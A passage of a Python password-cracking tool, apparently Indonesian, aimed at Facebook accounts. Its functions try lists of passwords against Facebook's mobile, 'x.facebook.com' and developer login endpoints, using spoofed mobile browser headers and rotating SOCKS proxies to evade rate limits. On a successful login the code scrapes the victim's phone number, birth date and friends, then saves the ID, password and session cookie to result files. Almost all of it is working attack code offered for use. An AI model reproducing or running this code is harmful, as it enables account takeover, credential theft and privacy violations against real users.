			prog.advance(des)
			time.sleep(31)
	loop+=1

#---VALUDATE---#
def validatee1(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Validate [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ua = uaasepitgansxc()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

###----------[ ASYNC ]----------###
def crackapi(idf,pwv,nmf):
	global loop,ok,cp
	ua = uaasepitgansxc()
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]B-api {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
#-------[METHOD X.FACEBOOK.COM]--------#
def colmek1(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = uaasepitgansxc()
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]x.facebok.com [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=123481471329046&kid_directed_site=0&app_id=123481471329046&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D123481471329046%26state%3D97cgz67n%26redirect_uri%3Dhttps%253A%252F%252Fplogin.jd.id%252Fcgi-bin%252Fmlogin%252Ffacebookcallback%26scope%3Demail%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7da29ea1-31ba-4b07-a30d-9fdafc8bfdd7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fplogin.jd.id%2Fcgi-bin%2Fmlogin%2Ffacebookcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D97cgz67n%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
#-------[METHOD MOBILE BY ASEPITGANS]--------#
def wetv(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Wetv [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=253259228690463&kid_directed_site=0&app_id=253259228690463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D253259228690463%26cbt%3D1683050049643%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3398ed0a913c2%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%26client_id%3D253259228690463%26display%3Dtouch%26domain%3Dwetv.vip%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwetv.vip%252Fid%26locale%3Den_US%26logger_id%3Df30bf96e550f908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17db5ef6bc86dc%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%2526frame%253Df1e2d765f47980c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17db5ef6bc86dc%26domain%3Dwetv.vip%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwetv.vip%252Ff2ae15024f219a8%26relation%3Dopener%26frame%3Df1e2d765f47980c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
